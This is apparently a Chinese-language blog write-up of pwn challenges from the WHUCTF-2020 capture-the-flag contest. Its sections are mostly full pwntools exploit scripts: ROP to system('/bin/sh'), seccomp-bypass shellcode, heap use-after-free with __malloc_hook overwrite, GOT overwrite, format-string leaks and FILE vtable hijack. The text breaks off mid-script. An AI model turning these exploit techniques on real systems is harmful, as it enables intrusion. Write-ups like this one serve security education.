@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="这周比较闲🤣，看到老师把这个比赛发到了社团群里，就看了一下题目 比赛平台地址 pwnpwnpwnpwn12345678910111213141516171819202122232425from pwn import *context.log_level&#x3D;&#39;debug&#39;#p &#x3D; process(&#39;.&#x2F;pwn&#39;)p &#x3D; remote(&#39;218.197.154.9&#39;,10004)e &#x3D; ELF(&#39;.&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WHUCTF-2020 部分题目wp">
+<meta property="og:url" content="http://startpwn.top/2020/05/28/whuctf-2020-pwn/index.html">
+<meta property="og:site_name" content="Sp4rta&#39;s blog">
+<meta property="og:description" content="这周比较闲🤣，看到老师把这个比赛发到了社团群里，就看了一下题目 比赛平台地址 pwnpwnpwnpwn12345678910111213141516171819202122232425from pwn import *context.log_level&#x3D;&#39;debug&#39;#p &#x3D; process(&#39;.&#x2F;pwn&#39;)p &#x3D; remote(&#39;218.197.154.9&#39;,10004)e &#x3D; ELF(&#39;.&#x2F;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://uploader.shimo.im/f/3pGll6OifrBl5PRc.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/YOU52ezw4VkpyVEy.png!thumbnail">
+<meta property="article:published_time" content="2020-05-28T07:26:50.000Z">
+<meta property="article:modified_time" content="2020-05-28T07:37:46.773Z">
+<meta property="article:author" content="ssta">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://uploader.shimo.im/f/3pGll6OifrBl5PRc.png!thumbnail">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>WHUCTF-2020 部分题目wp</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/Links/">Links</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/05/13/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE%E7%9C%8BORW-Heap/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://startpwn.top/2020/05/28/whuctf-2020-pwn/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://startpwn.top/2020/05/28/whuctf-2020-pwn/&text=WHUCTF-2020 部分题目wp" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://startpwn.top/2020/05/28/whuctf-2020-pwn/&title=WHUCTF-2020 部分题目wp" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://startpwn.top/2020/05/28/whuctf-2020-pwn/&is_video=false&description=WHUCTF-2020 部分题目wp" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=WHUCTF-2020 部分题目wp&body=Check out this article: http://startpwn.top/2020/05/28/whuctf-2020-pwn/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://startpwn.top/2020/05/28/whuctf-2020-pwn/&title=WHUCTF-2020 部分题目wp" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://startpwn.top/2020/05/28/whuctf-2020-pwn/&title=WHUCTF-2020 部分题目wp" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://startpwn.top/2020/05/28/whuctf-2020-pwn/&title=WHUCTF-2020 部分题目wp" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://startpwn.top/2020/05/28/whuctf-2020-pwn/&title=WHUCTF-2020 部分题目wp" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://startpwn.top/2020/05/28/whuctf-2020-pwn/&name=WHUCTF-2020 部分题目wp&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://startpwn.top/2020/05/28/whuctf-2020-pwn/&t=WHUCTF-2020 部分题目wp" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number">1.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnpwnpwn"><span class="toc-number">1.1.</span> <span class="toc-text">pwnpwnpwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode"><span class="toc-number">1.2.</span> <span class="toc-text">shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FFF"><span class="toc-number">1.3.</span> <span class="toc-text">FFF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#attention"><span class="toc-number">1.4.</span> <span class="toc-text">attention</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#arbitrary"><span class="toc-number">1.5.</span> <span class="toc-text">arbitrary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#overflow"><span class="toc-number">1.6.</span> <span class="toc-text">overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#heaptrick"><span class="toc-number">1.7.</span> <span class="toc-text">heaptrick</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">2.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezcmd"><span class="toc-number">2.1.</span> <span class="toc-text">ezcmd</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        WHUCTF-2020 部分题目wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Sp4rta's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-05-28T07:26:50.000Z" itemprop="datePublished">2020-05-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>这周比较闲🤣，看到老师把这个比赛发到了社团群里，就看了一下题目</p>
+<p><a href="http://iwhu.info/" target="_blank" rel="noopener">比赛平台地址</a></p>
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="pwnpwnpwn"><a href="#pwnpwnpwn" class="headerlink" title="pwnpwnpwn"></a>pwnpwnpwn</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p = process('./pwn')</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'218.197.154.9'</span>,<span class="number">10004</span>)</span><br><span class="line">e = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">l = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"><span class="comment">#l = ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line">payload = <span class="number">140</span>*<span class="string">'A'</span></span><br><span class="line">payload += p32(e.sym[<span class="string">'write'</span>])</span><br><span class="line">payload += p32(e.sym[<span class="string">'easyabc'</span>])</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(e.got[<span class="string">'write'</span>])</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">l.address = u32(p.recv(<span class="number">4</span>)) - l.sym[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(l.address)</span><br><span class="line">payload = <span class="number">140</span>*<span class="string">'B'</span></span><br><span class="line">payload += p32(l.sym[<span class="string">'system'</span>])</span><br><span class="line">payload += p32(<span class="number">0x233</span>)</span><br><span class="line">payload += p32(l.search(<span class="string">'/bin/sh'</span>).next())</span><br><span class="line">p.recvuntil(<span class="string">'?\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>seccomp沙箱，禁用了execve系统调用，只能通过orw的shellcode来拿flag，问题是orw需要flag绝对路径，找到了一个可以将目录读到mem里的系统调用</p>
+<p><img src="https://uploader.shimo.im/f/3pGll6OifrBl5PRc.png!thumbnail" alt="图片"></p>
+<p>参考2019RCTF的一道题目<a href="https://kirin-say.top/2019/05/20/RCTF-2019-PWN/，需要修改一下write的size" target="_blank" rel="noopener">https://kirin-say.top/2019/05/20/RCTF-2019-PWN/，需要修改一下write的size</a></p>
+<p>找到目录为/FFFFFFFFFlag</p>
+<p><img src="https://uploader.shimo.im/f/YOU52ezw4VkpyVEy.png!thumbnail" alt="图片"></p>
+<p>然后直接读就好了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = <span class="string">'./pwn'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p = process('./pwn')</span></span><br><span class="line">p = remote(<span class="string">'218.197.154.9'</span>,<span class="number">10009</span>)</span><br><span class="line"></span><br><span class="line">sc = asm(shellcraft.cat(<span class="string">r'/FFFFFFFFFlag/flag'</span>))</span><br><span class="line">m=<span class="string">"/"</span></span><br><span class="line">s2=shellcraft.pushstr(m)+<span class="string">"\nmov rsi,0x10000\n\</span></span><br><span class="line"><span class="string">	mov rdi,rsp\n\</span></span><br><span class="line"><span class="string">	mov rax,2\n\</span></span><br><span class="line"><span class="string">	syscall\n\</span></span><br><span class="line"><span class="string">	mov rbx,rax\n\</span></span><br><span class="line"><span class="string">	mov rdi,rax\n\</span></span><br><span class="line"><span class="string">	mov rsi,rsp\n\</span></span><br><span class="line"><span class="string">	mov rdx,2048\n\</span></span><br><span class="line"><span class="string">	mov rax,0xd9\n\</span></span><br><span class="line"><span class="string">	syscall\n\</span></span><br><span class="line"><span class="string">	mov rdi,1\n\</span></span><br><span class="line"><span class="string">	mov rsi,rsp\n\</span></span><br><span class="line"><span class="string">	mov rdx,0x300\n\</span></span><br><span class="line"><span class="string">	mov [rsp+8],rax\n\</span></span><br><span class="line"><span class="string">	mov rax,1\n\</span></span><br><span class="line"><span class="string">	mov [rsp],rbx\n\</span></span><br><span class="line"><span class="string">	syscall"</span></span><br><span class="line">p.recvuntil(<span class="string">'Length of your shellcode:\n'</span>)</span><br><span class="line"><span class="comment"># p.send(str(len(asm(s2))))</span></span><br><span class="line">p.send(str(len(sc)))</span><br><span class="line">p.recvuntil(<span class="string">'Your shellcode:\n'</span>)</span><br><span class="line"><span class="comment"># p.send(asm(s2))</span></span><br><span class="line">p.send(sc)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'point:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="FFF"><a href="#FFF" class="headerlink" title="FFF"></a>FFF</h3><p>glibc堆利用入门题，free之后指针未清零导致uaf，结合fastbin attack可直接修改__malloc_hook</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'size?\n'</span>, str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'index?\n'</span>, str(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">'size?\n'</span>, str(size))</span><br><span class="line">	p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'index?\n'</span>, str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'4'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'index?\n'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./pwn')</span></span><br><span class="line">p = remote(<span class="string">'218.197.154.9'</span>,<span class="number">10007</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-88</span><span class="number">-0x10</span>-libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">onegadget = libc.address + <span class="number">283242</span> <span class="comment">#983716 987463</span></span><br><span class="line"><span class="comment"># uaf</span></span><br><span class="line"><span class="comment"># __malloc_hook --&gt; one_gadget</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">8</span>,p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 5</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x20</span>,<span class="string">'\x00'</span>*<span class="number">0x13</span>+p64(onegadget))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?\n'</span>, str(<span class="number">10</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="attention"><a href="#attention" class="headerlink" title="attention"></a>attention</h3><p>将操作次数错位成chunk size位，分配到全局指针ptr，然后修改got表即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"># [*] &#39;&#x2F;media&#x2F;psf&#x2F;pwn&#x2F;whuctf&#x2F;attention&#x2F;attachment (1)&#x2F;pwn&#39;</span><br><span class="line">#     Arch:     amd64-64-little</span><br><span class="line">#     RELRO:    Partial RELRO</span><br><span class="line">#     Stack:    Canary found</span><br><span class="line">#     NX:       NX enabled</span><br><span class="line">#     PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">def add():</span><br><span class="line">	p.sendlineafter(&#39;choice :\n&#39;,&#39;1&#39;)</span><br><span class="line">def edit(name, data):</span><br><span class="line">	p.sendlineafter(&#39;choice :\n&#39;,&#39;2&#39;)</span><br><span class="line">	p.sendafter(&#39;name:\n&#39;, name)</span><br><span class="line">	p.sendafter(&#39;data:\n&#39;, data)</span><br><span class="line">def free():</span><br><span class="line">	p.sendlineafter(&#39;choice :\n&#39;,&#39;3&#39;)</span><br><span class="line">def show():</span><br><span class="line">	p.sendlineafter(&#39;choice :\n&#39;,&#39;4&#39;)</span><br><span class="line"></span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;pwn&#39;)</span><br><span class="line">p &#x3D; remote(&#39;218.197.154.9&#39;,10002)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;pwn&#39;)</span><br><span class="line">libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">for i in range(0x3d):</span><br><span class="line">	add()</span><br><span class="line">free()</span><br><span class="line">edit(p64(0x6010a0),&#39;\x31&#39;)</span><br><span class="line">add()</span><br><span class="line">add() # malloc ptr</span><br><span class="line">edit(p64(elf.got[&#39;atoi&#39;]),&#39;A&#39;)</span><br><span class="line">show()</span><br><span class="line"># leak libc</span><br><span class="line">p.recvuntil(&#39;name:&#39;)</span><br><span class="line">libc.address &#x3D; u64(p.recv(6).ljust(8,&#39;\x00&#39;)) - libc.sym[&#39;atoi&#39;]</span><br><span class="line">log.success(&#39;libc: --&gt; %s&#39; % hex(libc.address))</span><br><span class="line"># exit@got --&gt; onegadget</span><br><span class="line">one_gadget &#x3D; libc.address + 987463</span><br><span class="line">edit(p64(libc.sym[&#39;atoi&#39;]),p64(one_gadget))</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.sendlineafter(&#39;choice :\n&#39;,&#39;5&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="arbitrary"><a href="#arbitrary" class="headerlink" title="arbitrary"></a>arbitrary</h3><p>开了printf_chk，fmtstr 只能leak不能write，拿到libc地址和canary后，正常溢出覆盖返回地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p = process('./pwn')</span></span><br><span class="line">p = remote(<span class="string">'218.197.154.9'</span>,<span class="number">10005</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'choice&gt;&gt;\n'</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendline(<span class="string">'%p.'</span>*<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">	p.recvuntil(<span class="string">'.'</span>)</span><br><span class="line">code_base = int(p.recvuntil(<span class="string">'.'</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)<span class="number">-0xca7</span></span><br><span class="line">log.success(<span class="string">'text: %s'</span>%hex(code_base))</span><br><span class="line">p.recvuntil(<span class="string">'.'</span>)</span><br><span class="line">canary = int(p.recvuntil(<span class="string">'.'</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)<span class="number">-0xa</span></span><br><span class="line">log.success(<span class="string">'canary: %s'</span>%hex(canary))</span><br><span class="line">p.recvuntil(<span class="string">'.'</span>)</span><br><span class="line">libc_base = int(p.recvuntil(<span class="string">'.'</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)<span class="number">-0x20830</span></span><br><span class="line">log.success(<span class="string">'libc: %s'</span>%hex(libc_base))</span><br><span class="line">p.sendlineafter(<span class="string">'choice&gt;&gt;\n'</span>,<span class="string">'2'</span>)</span><br><span class="line"><span class="comment">#p.recvuntil('data"\n\n')</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">'ssta'</span>)</span><br><span class="line">one_gadget = libc_base + <span class="number">283158</span> <span class="comment">#283242 983716 987463</span></span><br><span class="line"><span class="comment">#p.recvuntil('data"\n\n')</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">'A'</span>*<span class="number">56</span>+p64(canary)+p64(<span class="number">0</span>)+p64(one_gadget))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><p>整数截断绕过长度限制，伪造stdout劫持vtables到bss上</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level ='debug'</span></span><br><span class="line"><span class="comment"># p = process('./pwn')</span></span><br><span class="line">p = remote(<span class="string">'218.197.154.9'</span>,<span class="number">10006</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">p.recvuntil(<span class="string">'Gift:\n'</span>)</span><br><span class="line">ptr_p =int(p.recvline().strip(),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">'Gift p: %s'</span> % hex(ptr_p))</span><br><span class="line">p.sendlineafter(<span class="string">'Choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Offset:\n'</span>,<span class="string">'-34'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'data:\n\x00\x00'</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3c5540</span></span><br><span class="line">log.success(<span class="string">'libc: %s'</span> % hex(libc.address))</span><br><span class="line">fake_stdout = <span class="string">''</span></span><br><span class="line">fake_stdout += p64(<span class="number">0x00000000fbad2887</span>)+p64(libc.address+<span 